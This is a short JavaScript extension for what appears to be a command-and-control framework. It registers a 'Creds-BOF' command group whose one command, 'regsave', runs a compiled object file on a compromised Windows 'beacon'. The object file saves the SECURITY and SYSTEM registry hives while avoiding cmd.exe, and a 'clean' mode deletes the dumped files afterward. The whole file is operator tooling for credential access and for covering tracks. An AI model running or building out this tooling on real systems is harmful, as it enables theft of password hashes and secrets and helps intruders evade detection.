var metadata = {
    name: "Creds-BOF",
    description: "Credential Access BOFs"
};


var cmd_regsave = ax.create_command(
    "regsave",
    "Save SECURITY + SYSTEM hives via WinAPI (no cmd.exe)",
    "regsave\nregsave clean C:\\Windows\\Temp\\rs_xxx.tmp C:\\Windows\\Temp\\rs_yyy.tmp"
);

cmd_regsave.addArgString("action", false, "dump (default) or clean");
cmd_regsave.addArgString("path1",  false, "first file to delete (clean mode)");
cmd_regsave.addArgString("path2",  false, "second file to delete (clean mode)");

cmd_regsave.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["action"] || "dump";
    let path1  = parsed_json["path1"]  || "";
    let path2  = parsed_json["path2"]  || "";

    let bof_params = ax.bof_pack("wstr,wstr,wstr", [action, path1, path2]);
    let bof_path = ax.script_dir() + "_bin/regsave." + ax.arch(id) + ".o";
    let message  = "regsave: " + action;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});


var cred_group = ax.create_commands_group("Creds-BOF", [cmd_regsave]);
ax.register_commands_group(cred_group, ["beacon"], ["windows"], []);
